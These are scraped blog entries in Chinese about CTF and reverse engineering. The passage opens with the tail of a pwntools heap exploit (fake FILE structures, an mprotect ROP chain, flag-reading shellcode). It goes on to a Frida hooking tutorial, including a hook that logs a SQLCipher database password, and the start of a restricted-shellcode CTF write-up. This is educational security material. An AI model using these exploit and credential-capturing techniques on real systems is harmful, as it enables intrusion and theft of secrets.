class="line">fake_file1 += p64(<span class="number">0xffffffff</span>)</span><br><span class="line">fake_file1 = fake_file1.ljust(<span class="number">0x78</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_file1 += p64(heap_base)     <span class="comment"># _lock</span></span><br><span class="line">fake_file1 = fake_file1.ljust(<span class="number">0x90</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_file1 += p64(heap_base + <span class="number">0x290</span> + <span class="number">0x100</span>)    <span class="comment"># _wide_data</span></span><br><span class="line">fake_file1 = fake_file1.ljust(<span class="number">0xc8</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_file1 += p64(IO_wfile_jumps)      <span class="comment"># vtable</span></span><br><span class="line">fake_file1 = fake_file1.ljust(<span class="number">0x100</span> - <span class="number">0x10</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line">fake_wide = <span class="string">b&#x27;\x00&#x27;</span> * <span class="number">0x68</span></span><br><span class="line">fake_wide += p64(setcontext_61)     <span class="comment"># _wide_vtable + 0x68</span></span><br><span class="line">fake_wide = fake_wide.ljust(<span class="number">0xa0</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_wide += p64(heap_base + <span class="number">0xcc0</span>)    <span class="comment"># rsp -&gt; orw_addr</span></span><br><span class="line">fake_wide += p64(p_rdi_r + <span class="number">1</span>)       <span class="comment"># rip -&gt; ret</span></span><br><span class="line">fake_wide = fake_wide.ljust(<span class="number">0xe0</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_wide += p64(heap_base + <span class="number">0x290</span> + <span class="number">0x100</span>)     <span class="comment"># _wide_vtable</span></span><br><span class="line"></span><br><span class="line">fake_file1 += fake_wide</span><br><span class="line">edit(<span class="number">0</span>, fake_file1, <span class="string">b&#x27;pursue&#x27;</span>)</span><br><span class="line"></span><br><span class="line">pld = p64(p_rdi_r) + p64(heap_base)</span><br><span class="line">pld += p64(p_rsi_r) + p64(<span class="number">0x2000</span>)</span><br><span class="line">pld += p64(p_rdx_r12_r) + p64(<span class="number">7</span>) + p64(<span class="number">0</span>)</span><br><span class="line">pld += p64(mprotect)</span><br><span class="line">pld += p64(heap_base + <span class="number">0xcc0</span> + <span class="number">0x48</span>)</span><br><span class="line"></span><br><span class="line">shellcode = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">mov rax, 192</span></span><br><span class="line"><span class="string">mov rbx, 0x400000</span></span><br><span class="line"><span class="string">mov rcx, 0x1000</span></span><br><span class="line"><span class="string">mov rdx, 7</span></span><br><span class="line"><span class="string">mov rsi, 34</span></span><br><span class="line"><span class="string">xor rdi, rdi</span></span><br><span class="line"><span class="string">xor rbp, rbp</span></span><br><span class="line"><span class="string">int 0x80</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">xor rax, rax</span></span><br><span class="line"><span class="string">xor rdi, rdi</span></span><br><span class="line"><span class="string">mov rsi, 0x400400</span></span><br><span class="line"><span class="string">mov rdx, 0x10</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">mov rax, 5</span></span><br><span class="line"><span class="string">mov rbx, 0x400400</span></span><br><span class="line"><span class="string">xor rcx, rcx</span></span><br><span class="line"><span class="string">xor rdx, rdx</span></span><br><span class="line"><span class="string">int 0x80</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">mov rdi, rax</span></span><br><span class="line"><span class="string">mov rsi, 0x400500</span></span><br><span class="line"><span class="string">mov rdx, 0x20</span></span><br><span class="line"><span class="string">xor rax, rax</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">mov rax, 1</span></span><br><span class="line"><span class="string">mov rdi, 1</span></span><br><span class="line"><span class="string">mov rsi, 0x400500</span></span><br><span class="line"><span class="string">mov rdx, 0x20</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">pld += asm(shellcode)</span><br><span class="line">edit(<span class="number">1</span>, pld, <span class="string">b&#x27;pursue&#x27;</span>)</span><br><span class="line"></span><br><span class="line">sla(<span class="string">&#x27;choice: &#x27;</span>, <span class="string">b&#x27;5&#x27;</span>)</span><br><span class="line">s(<span class="string">&#x27;flag\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>强网拟态</tag>
      </tags>
  </entry>
  <entry>
    <title>Frida Hook 技术</title>
    <url>/2022/11/19/Reverse/Frida/</url>
    <content><![CDATA[<h2 id="环境安装"><a href="#环境安装" class="headerlink" title="环境安装"></a>环境安装</h2><p>下载Frida，注意<code>frida</code>和<code>frida-tools</code>的版本要相互匹配，在<a href="https://github.com/frida/frida/releases?page=1">Frida资源库</a>上查看：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">pip install frida -i https://pypi.tuna.tsinghua.edu.cn/simple</span><br><span class="line">pip install frida-tools -i https://pypi.tuna.tsinghua.edu.cn/simple</span><br></pre></td></tr></table></figure>

<h2 id="Android上进行Hook"><a href="#Android上进行Hook" class="headerlink" title="Android上进行Hook"></a>Android上进行Hook</h2><h3 id="环境准备"><a href="#环境准备" class="headerlink" title="环境准备"></a>环境准备</h3><p>首先，需要设置安卓机或者安卓模拟器为Root权限，还需要准备adb(安卓调试桥)工具。</p>
<p>adb的使用可以参考：<a href="https://developer.android.google.cn/studio/command-line/adb?hl=zh-cn#shellcommands">Android 调试桥 (adb)  | Android 开发者  | Android Developers (google.cn)</a>，总结了部分命令：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">adb start-server	# 启动adb服务</span><br><span class="line">adb kill-server		# 关闭adb服务</span><br><span class="line"></span><br><span class="line">adb devices			# 显示已连接的设备信息</span><br><span class="line">adb root</span><br><span class="line">adb shell			# 启动交互式的shell</span><br><span class="line"></span><br><span class="line">adb shell pm list packages		# 显示所有的应用</span><br><span class="line">adb shell pm list packages -3	# 显示第三方的应用</span><br></pre></td></tr></table></figure>

<span id="more"></span>

<p>接着，我们需要在安卓机或者安卓模拟器上安装对应Frida版本，在<a href="https://github.com/frida/frida/releases?page=1">Frida资源库</a>上查看：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">真机：</span><br><span class="line">frida-server-16.0.2-android-arm.xz</span><br><span class="line">frida-server-16.0.2-android-arm64.xz</span><br><span class="line"></span><br><span class="line">模拟器：</span><br><span class="line">frida-server-16.0.2-android-x86.xz</span><br><span class="line">frida-server-16.0.2-android-x86_64.xz</span><br></pre></td></tr></table></figure>

<p>将下载的服务塞到机子里：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">adb push frida-server-16.0.2-android-x86_64 /data/local/tmp</span><br><span class="line">adb shell &quot;chmod 777 /data/local/tmp/frida-server-16.0.2-android-x86_64&quot;</span><br><span class="line">adb shell &quot;/data/local/tmp/frida-server-16.0.2-android-x86_64 &amp;&quot;</span><br><span class="line">adb shell &quot;/data/local/tmp/frida-server-16.0.2-android-x86_64 -l 127.0.0.1:8888&quot;	# 按指定的端口启动</span><br><span class="line">adb forward tcp:27042 tcp:27042		# 默认使用27042端口进行转发</span><br></pre></td></tr></table></figure>

<p>这时候我们可以看到安卓机里的<code>27042</code>端口开启了frida的监听，同时我们也可以在Windows终端查看服务：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">adb shell</span></span><br><span class="line">netstat -napt</span><br><span class="line"></span><br><span class="line">Active Internet connections (established and servers)</span><br><span class="line">Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program Name</span><br><span class="line">tcp        0      0 127.0.0.1:27042         0.0.0.0:*               LISTEN      2939/frida-server-16.0.2-android-x86_64</span><br><span class="line">tcp6       0      0 :::5555                 :::*                    LISTEN      1437/adbd</span><br><span class="line">tcp6       0      0 ::ffff:172.16.1.15:5555 ::ffff:172.16.1.2:55963 ESTABLISHED 1437/adbd</span><br><span class="line"></span><br><span class="line">-----------------------------------------------------------------------------------</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">windows shell</span></span><br><span class="line">frida-ps -U		# 显示一个进程列表</span><br><span class="line"></span><br><span class="line"> PID  Name</span><br><span class="line">----  -----------------------------------------------</span><br><span class="line">1437  adbd</span><br><span class="line">1959  android.ext.services</span><br><span class="line">1411  android.hardware.audio@2.0-service</span><br><span class="line">1412  android.hardware.bluetooth@1.0-service-qti</span><br><span class="line">1413  android.hardware.broadcastradio@1.1-service</span><br><span class="line">1414  android.hardware.camera.provider@2.4-service</span><br><span class="line">... ...</span><br></pre></td></tr></table></figure>



<h3 id="Hook命令"><a href="#Hook命令" class="headerlink" title="Hook命令"></a>Hook命令</h3><p><code>frida-trace</code>使得我们可以跟踪APK中的函数调用，使用如下：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">frida-trace -i &quot;&lt;函数名&gt;&quot; -U &lt;进程名&gt;</span><br><span class="line">frida-trace -i &quot;&lt;函数名&gt;&quot; -U -f &lt;包名&gt;</span><br><span class="line"></span><br><span class="line">frida-trace -i &quot;open*&quot; -U -f &lt;包名&gt;		# 使用通配符 *</span><br><span class="line"></span><br><span class="line">-----------------------------------------------------------------------------------</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">例如</span></span><br><span class="line">frida-trace -i &quot;open&quot; -U -f hk.gov.ogcio.leavehomesafe</span><br><span class="line">-----------------------------------------------------------</span><br><span class="line">Instrumenting...</span><br><span class="line">open: Loaded handler at &quot;E:\\ctf\\Re\\Frida\\__handlers__\\libc.so\\open.js&quot;</span><br><span class="line">Started tracing 1 function. Press Ctrl+C to stop.</span><br><span class="line">           /* TID 0x278a */</span><br><span class="line">    27 ms  open()</span><br><span class="line">    30 ms  open()</span><br><span class="line">    42 ms  open()</span><br><span class="line">    42 ms  open()</span><br><span class="line">    43 ms  open()</span><br><span class="line">    43 ms  open()</span><br><span class="line">    43 ms  open()</span><br><span class="line">    43 ms  open()</span><br><span class="line">    43 ms  open()</span><br><span class="line">    44 ms  open()</span><br><span class="line">           /* TID 0x27b7 */</span><br><span class="line">    50 ms  open()</span><br><span class="line">           /* TID 0x27b8 */</span><br><span class="line">    54 ms  open()</span><br><span class="line">    55 ms  open()</span><br><span class="line">    55 ms  open()</span><br></pre></td></tr></table></figure>

<p>下面介绍两种hook方式：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Attach 进程</span></span><br><span class="line">frida -U -l &lt;脚本文件&gt; &lt;进程名&gt;</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Spawn 重启app</span></span><br><span class="line">frida -U -f &lt;包名&gt; -l &lt;脚本文件&gt; --no-pause</span><br><span class="line"></span><br><span class="line">-----------------------------------------------------------------------------------</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">例如</span></span><br><span class="line">frida -U -f com.example.frida -l .\test.js</span><br><span class="line">-----------------------------------------------------------</span><br><span class="line">     ____</span><br><span class="line">    / _  |   Frida 16.0.2 - A world-class dynamic instrumentation toolkit</span><br><span class="line">   | (_| |</span><br><span class="line">    &gt; _  |   Commands:</span><br><span class="line">   /_/ |_|       help      -&gt; Displays the help system</span><br><span class="line">   . . . .       object?   -&gt; Display information about &#x27;object&#x27;</span><br><span class="line">   . . . .       exit/quit -&gt; Exit</span><br><span class="line">   . . . .</span><br><span class="line">   . . . .   More info at https://frida.re/docs/home/</span><br><span class="line">   . . . .</span><br><span class="line">   . . . .   Connected to Android Emulator 5554 (id=emulator-5554)</span><br><span class="line">Spawned `com.example.frida`. Resuming main thread!</span><br><span class="line">[Android Emulator 5554::com.example.frida ]-&gt; p1: 10</span><br><span class="line">p2: 21</span><br><span class="line">result: 31</span><br></pre></td></tr></table></figure>

<p>除了可以在终端中进行hook命令，同时我们也可以编写Python的脚本进行hook。还有，也可以通过雷电APK分析软件的Frida功能进行hook。<strong>注意两点</strong>：一是，尽量不要同时用adb和雷电分析软件同时进行hook，也就是不要在终端敲完了命令再去雷电里搞点操作，似乎两者不兼容，由此可能会报错，要反复重启安卓机才可能解决问题，推荐直接敲命令，不然雷电报错了都不知道什么原因；二是，尽量开启安卓机的Root权限。</p>
<h3 id="Native-Hook"><a href="#Native-Hook" class="headerlink" title="Native Hook"></a>Native Hook</h3><p>首先，了解Java是什么调用外部库的：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">static</span> &#123;</span><br><span class="line">    System.loadLibrary(<span class="string">&quot;test&quot;</span>);		<span class="comment">// 引用了 libtest.so 文件</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">native</span> String <span class="title function_">helloPersonFromJNI</span><span class="params">(String str, String str2)</span>;	<span class="comment">// 使用了so文件里面的api</span></span><br></pre></td></tr></table></figure>

<p>在资源文件里我们需要采用对应架构的so文件，常见的安卓机都是arm的架构，而x86和x86_64尝尝用于虚拟机，可以用adb来查看安卓虚拟机的架构：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">adb shell cat /proc/cpuinfo</span><br><span class="line">-----------------------------------------</span><br><span class="line">processor       : 0</span><br><span class="line">vendor_id       : AuthenticAMD</span><br><span class="line">cpu family      : 25</span><br><span class="line">model           : 80</span><br><span class="line">model name      : AMD Ryzen 7 5800H with Radeon Graphics</span><br></pre></td></tr></table></figure>

<p>关于IDA反编译so文件：</p>
<ul>
<li>我们可以在导出窗口看到需要的函数。</li>
<li>一般来说，IDA会把函数所在的类也显示出来，比如调用的是<code>Java.com.example.frida.function()</code>，那么在IDA里面的函数是<code>Java_com_example_frida_function()</code>。</li>
<li>一般so文件里面函数的参数和Java代码里面的参数数量不同，默认是后面的参数。</li>
</ul>
<h2 id="js脚本的编写"><a href="#js脚本的编写" class="headerlink" title="js脚本的编写"></a>js脚本的编写</h2><h3 id="基础脚本"><a href="#基础脚本" class="headerlink" title="基础脚本"></a>基础脚本</h3><p>一个简单的用法示例：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span> (<span class="params"></span>) &#123;		<span class="comment">// 确保当前线程连接到 Java VM 并调用</span></span><br><span class="line">    <span class="keyword">const</span> instance = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&#x27;com.example.frida.MainActivity&#x27;</span>);	<span class="comment">// 返回包裹好的JS对象</span></span><br><span class="line">    instance.&lt;方法名&gt;.<span class="property">implementation</span> = <span class="keyword">function</span> (<span class="params">p1, p2</span>) &#123;		<span class="comment">// 参数的数量要和源方法相同</span></span><br><span class="line">        <span class="keyword">var</span> result = <span class="variable language_">this</span>.&lt;方法名&gt;(p1, p2);	<span class="comment">// 调用自身</span></span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;result:&quot;</span>, result);</span><br><span class="line">        ... ...</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">return</span> result;		<span class="comment">// 如果源方法具有返回值，那必须 return，否则程序会卡住</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

<p>带有重载函数的编写，需要用<code>overload</code>方法，对于参数的选定，可以在报错中寻找，下面是一个获取数据库密码的一个脚本：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">const</span> instance = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&#x27;net.sqlcipher.database.SQLiteOpenHelper&#x27;</span>);</span><br><span class="line">    instance.<span class="property">getWritableDatabase</span>.<span class="title function_">overload</span>(<span class="string">&#x27;[C&#x27;</span>).<span class="property">implementation</span> = <span class="keyword">function</span> (<span class="params">p1</span>) &#123;	<span class="comment">// overload 重载</span></span><br><span class="line">        <span class="keyword">const</span> javaString = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&#x27;java.lang.String&#x27;</span>)</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;数据库密码:&quot;</span>, javaString.$new(p1))		<span class="comment">// $new() 表示新建一个对象，这里是 String</span></span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">this</span>.<span class="title function_">getWritableDatabase</span>(p1)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

<p>对于内部类的hook，可以这样编写：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> instance = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&#x27;com.example.frida.MainActivity$&lt;内部类的类名&gt;&#x27;</span>)</span><br></pre></td></tr></table></figure>

<p>有的时候我们不需要修改方法，只是希望主动去触发一个方法或者函数，这时候怎么办呢？</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 不影响进程</span></span><br><span class="line"><span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">const</span> instance = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&#x27;com.example.frida.MainActivity&#x27;</span>);</span><br><span class="line">    <span class="keyword">var</span> object = instance.$new()	<span class="comment">// 创造该类的一个对象</span></span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(object.&lt;方法名&gt;(arg1, arg2))		<span class="comment">// 调用方法</span></span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(object.&lt;方法名&gt;.&lt;变量名&gt;)			<span class="comment">// 调用变量</span></span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(instance.&lt;静态变量&gt;)		<span class="comment">// 调用静态变量</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>



<h3 id="Native脚本"><a href="#Native脚本" class="headerlink" title="Native脚本"></a>Native脚本</h3><p>一个简单的模板：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">    <span class="comment">// var n_addr_func = Module.findExportByName(&quot;so文件名&quot;, &quot;方法名&quot;)</span></span><br><span class="line">   <span class="keyword">var</span> base_addr = <span class="title class_">Module</span>.<span class="title function_">findBaseAddress</span>(<span class="string">&quot;so文件名&quot;</span>);</span><br><span class="line">   <span class="keyword">var</span> n_addr_func = base_addr.<span class="title function_">add</span>(&lt;地址偏移&gt;);		<span class="comment">// 目标函数的偏移, arm-v7地址偏移+1</span></span><br><span class="line">    <span class="title class_">Interceptor</span>.<span class="title function_">attach</span>(n_addr_func,&#123;        </span><br><span class="line">      <span class="attr">onEnter</span>: <span class="keyword">function</span>(<span class="params">args</span>)&#123;			<span class="comment">// 在hook函数之前</span></span><br><span class="line">         <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;arg 1：&quot;</span> + args[<span class="number">0</span>].<span class="title function_">readCString</span>());		<span class="comment">// readCString() 应该是用来读取对应地址的内容</span></span><br><span class="line">     &#125;, </span><br><span class="line">     <span class="attr">onLeave</span>:<span class="keyword">function</span>(<span class="params">retval</span>)&#123;			<span class="comment">// 在hook函数之后</span></span><br><span class="line">         <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;ret：&quot;</span>, retval);</span><br><span class="line">         retval.<span class="title function_">replace</span>(<span class="number">0</span>);		<span class="comment">// 代替返回值</span></span><br><span class="line">     &#125;  </span><br><span class="line">    &#125;);  </span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

<p>在运行后很有可能会报错，例如：<code>TypeError: cannot read property &#39;add&#39; of null</code>，并不是我们脚本不对，<strong>而是可能没有通过操作来触发这个函数</strong>。解决方法是，重新保存js脚本，这样frida就会重新载入，然后进行点击按钮之类的触发操作即可成功。</p>
<p>下面是大佬给的脚本，可以完美解决上面的错误，了解即可：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">onLoadModule</span>(<span class="params">onLoadCallback</span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> linker = <span class="title class_">Process</span>.<span class="title function_">findModuleByName</span>(<span class="title class_">Process</span>.<span class="property">arch</span>.<span class="title function_">indexOf</span>(<span class="string">&#x27;64&#x27;</span>) &gt;= <span class="number">0</span> ? <span class="string">&#x27;linker64&#x27;</span> : <span class="string">&quot;linker&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (!linker) &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;find linker failed&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">var</span> interceptors = [];</span><br><span class="line">    <span class="keyword">var</span> symbols = linker.<span class="title function_">enumerateSymbols</span>();</span><br><span class="line">    <span class="keyword">var</span> doDlOpenPtr = <span class="variable constant_">NULL</span>;</span><br><span class="line">    <span class="keyword">var</span> callCtor = <span class="variable constant_">NULL</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> index <span class="keyword">in</span> symbols) &#123;</span><br><span class="line">        <span class="keyword">if</span> (symbols[index].<span class="property">name</span>.<span class="title function_">indexOf</span>(<span class="string">&quot;call_constructor&quot;</span>) &gt;= <span class="number">0</span>) &#123;</span><br><span class="line">            callCtor = symbols[index].<span class="property">address</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (symbols[index].<span class="property">name</span>.<span class="title function_">indexOf</span>(<span class="string">&#x27;do_dlopen&#x27;</span>) &gt;= <span class="number">0</span>) &#123;</span><br><span class="line">            doDlOpenPtr = symbols[index].<span class="property">address</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (callCtor.<span class="title function_">compare</span>(<span class="variable constant_">NULL</span>) &gt; <span class="number">0</span> &amp;&amp; doDlOpenPtr.<span class="title function_">compare</span>(<span class="variable constant_">NULL</span>) &gt; <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (callCtor.<span class="title function_">compare</span>(<span class="variable constant_">NULL</span>) &gt; <span class="number">0</span> &amp;&amp; doDlOpenPtr.<span class="title function_">compare</span>(<span class="variable constant_">NULL</span>) &gt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">let</span> moduleName = <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line">        interceptors.<span class="title function_">push</span>(<span class="title class_">Interceptor</span>.<span class="title function_">attach</span>(callCtor, <span class="keyword">function</span> (<span class="params">args</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (moduleName &amp;&amp; onLoadCallback) &#123;</span><br><span class="line">                <span class="title function_">onLoadCallback</span>(moduleName);</span><br><span class="line">                moduleName = <span class="literal">null</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;));</span><br><span class="line"></span><br><span class="line">        interceptors.<span class="title function_">push</span>(<span class="title class_">Interceptor</span>.<span class="title function_">attach</span>(doDlOpenPtr, <span class="keyword">function</span> (<span class="params">args</span>) &#123;</span><br><span class="line">            moduleName = args[<span class="number">0</span>].<span class="title function_">readCString</span>();</span><br><span class="line">        &#125;));</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 上面是固定写法，下面才是我们的应用部分</span></span><br><span class="line"><span class="title function_">onLoadModule</span>(<span class="keyword">function</span>(<span class="params">moduleName</span>) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(moduleName)</span><br><span class="line">    <span class="keyword">if</span> (moduleName.<span class="title function_">includes</span>(<span class="string">&quot;so文件名&quot;</span>)) &#123;</span><br><span class="line">        <span class="keyword">var</span> base_addr = <span class="title class_">Module</span>.<span class="title function_">findBaseAddress</span>(<span class="string">&quot;so文件名&quot;</span>);</span><br><span class="line">        <span class="title class_">Interceptor</span>.<span class="title function_">attach</span>(base_addr.<span class="title function_">add</span>(&lt;地址偏移&gt;), &#123;</span><br><span class="line">            <span class="attr">onEnter</span>: <span class="keyword">function</span> (<span class="params">args</span>) &#123;</span><br><span class="line">                <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;arg 1：&quot;</span> + args[<span class="number">0</span>].<span class="title function_">readCString</span>());</span><br><span class="line">            &#125;,</span><br><span class="line">            <span class="attr">onLeave</span>: <span class="keyword">function</span>(<span class="params">ret</span>) &#123;</span><br><span class="line">                <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;ret：&quot;</span>, retval);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>Re</category>
      </categories>
      <tags>
        <tag>Frida</tag>
      </tags>
  </entry>
  <entry>
    <title>2022 DASCTF X GFCTF 十月</title>
    <url>/2022/11/05/CTF/2022dasctf_x_gfctf/</url>
    <content><![CDATA[<h2 id="Pwn"><a href="#Pwn" class="headerlink" title="Pwn"></a>Pwn</h2><h3 id="1-5"><a href="#1-5" class="headerlink" title="1!5!"></a>1!5!</h3><p>限制字符的shellcode编写，一开始是想着直接调用<code>execve</code>来获取shell，但是发现<code>/bin/sh</code>怎么也写不进去，看了wp，想到程序还开辟了一段可执行区域，所以想到写shellcode调用read向其中写入调用shell的汇编即可，主要利用了<strong>跳转汇编处的寄存器残留</strong>。</p>
<span id="more"></span>

<p>看一下寄存器的残留情况：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">*RAX  0x0</span><br><span class="line"> RBX  0x0</span><br><span class="line"> RCX  0x7fb743c98992 (read+18) ◂— cmp    rax, -0x1000 /* &#x27;H=&#x27; */</span><br><span class="line">*RDX  0x10000 ◂— xor    eax, 0x444e5859 /* 0x444231444e585935 */</span><br><span class="line">*RDI  0x7ffc9ba18f10 ◂— &#x27;15aABCDEFGHIJKLMNOPQRSUVWXYZ&#x27;</span><br><span class="line">*RSI  0x41</span><br><span class="line"> R8   0xffffffff</span><br><span class="line"> R9   0x0</span><br><span class="line">*R10  0x7fb743b8a858 ◂— 0xf001a0000102c</span><br><span class="line">*R11  0x7fb743d21300 (__strchr_avx2) ◂— endbr64 </span><br><span class="line"> R12  0x7ffc9ba19078 —▸ 0x7ffc9ba1a3ad ◂— 0x4853006e77702f2e /* &#x27;./pwn&#x27; */</span><br><span class="line"> R13  0x558075817269 (main) ◂— push   rbp</span><br><span class="line"> R14  0x558075819dd8 (__do_global_dtors_aux_fini_array_entry) —▸ 0x558075817130 (__do_global_dtors_aux) ◂— endbr64 </span><br><span class="line"> R15  0x7fb743df7040 (_rtld_global) —▸ 0x7fb743df82e0 —▸ 0x558075816000 ◂— 0x10102464c457f</span><br><span class="line"> RBP  0x7ffc9ba18f60 ◂— 0x1</span><br><span class="line">*RSP  0x7fb743df4800 ◂— 0x0</span><br><span class="line">*RIP  0x558075817324 (main+187) ◂— jmp    rdx</span><br></pre></td></tr></table></figure>

<p>对于构造<code>read(0, 0x1000, rdx)</code>，我们需要构造的是<code>pop rdi</code>和<code>pop rsi</code>和<code>syscall</code>，其对应的十六进制数为<code>0x5f</code>、<code>0x5e</code>、<code>0xf05</code>。</p>
<p>注意限制了字符，所以我们需要看看哪些汇编可以用：</p>
<ul>
<li><p>首先是栈操作：</p>
<table>
<thead>
<tr>
<th>ASCII</th>
<th>HEX</th>
<th>汇编</th>
</tr>
</thead>
<tbody><tr>
<td>P</td>
<td>0x50</td>
<td><code>push rax</code></td>
</tr>
<tr>
<td>Q</td>
<td>0x51</td>
<td><code>push rcx</code></td>
</tr>
<tr>
<td>R</td>
<td>0x52</td>
<td><code>push rdx</code></td>
</tr>
<tr>
<td>S</td>
<td>0x53</td>
<td><code>push rbx</code></td>
</tr>
<tr>
<td>T</td>
<td>0x54</td>
<td><code>push rsp</code></td>
</tr>
<tr>
<td>U</td>
<td>0x55</td>
<td><code>push rbp</code></td>
</tr>
<tr>
<td>V</td>
<td>0x56</td>
<td><code>push rsi</code></td>
</tr>
<tr>
<td>W</td>
<td>0x57</td>
<td><code>push rdi</code></td>
</tr>
<tr>
<td>X</td>
<td>0x58</td>
<td><code>pop rax</code></td>
</tr>
<tr>
<td>Y</td>
<td>0x59</td>
<td><code>pop rcx</code></td>
</tr>
<tr>
<td>Z</td>
<td>0x5a</td>
<td><code>pop rdx</code></td>
</tr>
</tbody></table>
</li>
<li><p>考虑数据传输的问题。通常我们可以通过mov或者是push和pop的联合使用来实现数据传输，但是这里我们发现都不行，那我们只能使用异或运算来传输数据，由于用0异或一个数的值还是那个数，所以我们可以考虑用<code>xor eax, &lt;&gt;</code>来实现数据的传输，注意<strong>这里应该是只能异或<code>eax</code>这个寄存器</strong>。</p>
</li>
